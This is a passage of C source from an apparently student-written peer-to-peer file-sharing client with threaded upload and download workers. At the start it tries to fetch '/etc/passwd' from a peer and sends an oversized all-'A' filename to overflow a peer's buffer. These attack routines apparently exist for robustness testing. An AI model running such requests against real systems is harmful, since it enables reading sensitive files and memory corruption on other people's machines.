        strcpy(node.t->filename, "/etc/passwd");

        pthread_create(&node.thread, NULL, pdownload_worker, (void*) &node);
        pthread_join(node.thread, NULL);

        // Attempt to exploit buffer overrun in scan
        char* bigname = (char*)malloc(BIGNAME_SIZE);

        // Fill bigname with A's
        bigname[BIGNAME_SIZE-1] = 0;
        int i;

        for(i = 0; i < BIGNAME_SIZE-1; i++)
        {
            bigname[i] = 'A';
        }

        task_t* t = start_download(tracker_task, "cat1.jpg");

        task_download_evil(t, tracker_task, bigname);
    }

	return 0;
}

void*
pupload_worker(void* arg)
{
    task_t *t;

    // Get the linked list node passed in
    pu_prop_node_t* pu_prop_node = (pu_prop_node_t*)arg;

    assert(pu_prop_node->next == NULL);

    pu_prop_node->next = malloc(sizeof(pu_prop_node_t));
    pu_prop_node_t* next_node = (pu_prop_node_t*)pu_prop_node->next;
    next_node->listen_task = pu_prop_node->listen_task;
    next_node->next = NULL;

    // Attempt to open the socket
	t = task_listen(pu_prop_node->listen_task);

	//bool deferred_replacement = false;

	bool create = false;
	int snapshot_count;

    pthread_mutex_lock(&counter_mutex);

    // Socket has been opened; there is a client. Create another
    //  worker to handle more requests
    if(u_thread_counter < MAX_PARALLEL_OPERATIONS)
    {
        //deferred_replacement = true;
        create = true;

        u_thread_counter++;

        snapshot_count = u_thread_counter;
	}

	pthread_mutex_unlock(&counter_mutex);

	if(create)
        pthread_create(&next_node->thread, NULL, pupload_worker, next_node);

    // Upload the file
    printf("File is being uploaded... %d\n", snapshot_count);
    task_upload(t);

    // The concurrent pthread was not started; start one to replace this one when it dies
//    if(deferred_replacement)
//    {
//        pthread_create(&next_node->thread, NULL, pupload_worker, next_node);
//    }

    pthread_mutex_lock(&counter_mutex);
    u_thread_counter--;
    pthread_mutex_unlock(&counter_mutex);

    return NULL;
}

void
dispatch_pupload(task_t* listen_task)
{
    pu_prop_node_t *prop_list, *old_prop_list;

    prop_list = (pu_prop_node_t*)malloc(sizeof(pu_prop_node_t));
    prop_list->listen_task = listen_task;
    prop_list->next = NULL;

    pthread_mutex_init(&counter_mutex, NULL);
    u_thread_counter = 1;
    pthread_create(&prop_list->thread, NULL, pupload_worker, prop_list);

    // Run along the linked list and join to the processes
    while(prop_list)
    {
        pthread_join(prop_list->thread, NULL);

        old_prop_list = prop_list;
        prop_list = (pu_prop_node_t*)prop_list->next;
        free(old_prop_list);
    }
}

void*
pdownload_worker(void* arg)
{
	// Cast the argument to a useful type
	pd_prop_node_t* pd_prop_node = (pd_prop_node_t*)arg;

	if(!pd_prop_node->t || !pd_prop_node->tracker_task)
	{
		return NULL;
	}

	// Start the download with the given information
	task_download(pd_prop_node->t, pd_prop_node->tracker_task);

	return NULL;
}

void
dispatch_ppdownload(const task_t* tracker_task, const char** fnames, size_t fname_cnt)
{
    char** idxfnames = (char**)malloc(sizeof(char*) * fname_cnt);

    size_t i;
    for(i = 0; i < fname_cnt; i++)
	{
		idxfnames[i] = fname_w_ix("", fnames[i], ".idx");
	}

	dispatch_pdownload(tracker_task, (const char**)idxfnames, fname_cnt);

    for(i = 0; i < fname_cnt; i++)
	{
		index_t index_obj;

		read_index_file(idxfnames[i], &index_obj);

		char** partfnames = (char**)malloc(sizeof(char*) * index_obj.header.ih_nlines);

		size_t j;
		for(j = 0; j < index_obj.header.ih_nlines; j++)
		{
            partfnames[j] = index_obj.i_lines[j].il_fname;
		}

		dispatch_pdownload(tracker_task, (const char**)partfnames, index_obj.header.ih_nlines);

		reconstruct_file(fnames[i]);

		free(partfnames);
	}
}

void
dispatch_pdownload(const task_t* tracker_task, const char** fnames, size_t fname_cnt)
{
	assert(tracker_task->type == TASK_TRACKER);

//	printf("Number of files to download: %d\n", (int)fname_cnt);

	pd_prop_node_t *prop_list, *head;
	if(!(prop_list = head = (pd_prop_node_t*)malloc(sizeof(pd_prop_node_t))))
		die("Failed to allocate parallel download property list node\n");

	// Obtain all of the peer information for each of the files we want sequentially
	size_t i;
	for(i = 0; i < fname_cnt; i++)
	{
		// Allocate and copy the tracker_task struct into the property node
		head->tracker_task = (task_t*)malloc(sizeof(task_t));
		memcpy(head->tracker_task, tracker_task, sizeof(task_t));

		// Get the peer information for the i'th filename
		head->t = start_download(head->tracker_task, fnames[i]);

		if(i != fname_cnt-1)
		// Allocate the next property node and add it to the linked list
		head = (pd_prop_node_t*)(head->next = malloc(sizeof(pd_prop_node_t)));

	}

	head->next = NULL;

	for(head = prop_list; head != NULL; head = (pd_prop_node_t*)head->next)
	{
		if(!head->t || !head->tracker_task)
			continue;
		pthread_create(&head->thread, NULL, pdownload_worker, (void*) head);
	}

	for(head = prop_list; head != NULL; head = (pd_prop_node_t*)head->next)
	{
		if(!head->t || !head->tracker_task)
			continue;
		pthread_join(head->thread, NULL);
	}

	pd_prop_node_t *last_head;
	head = prop_list;
	while(head != NULL)
	{
		last_head = head;

		head = (pd_prop_node_t*)head->next;
		if(last_head->tracker_task)
		{
            // Prevent task_free from closing the original tracker_task's file descriptors
            last_head->tracker_task->disk_fd = -1;
            last_head->tracker_task->peer_fd = -1;

			task_free(last_head->tracker_task);
        }
		free(last_head);
	}

}
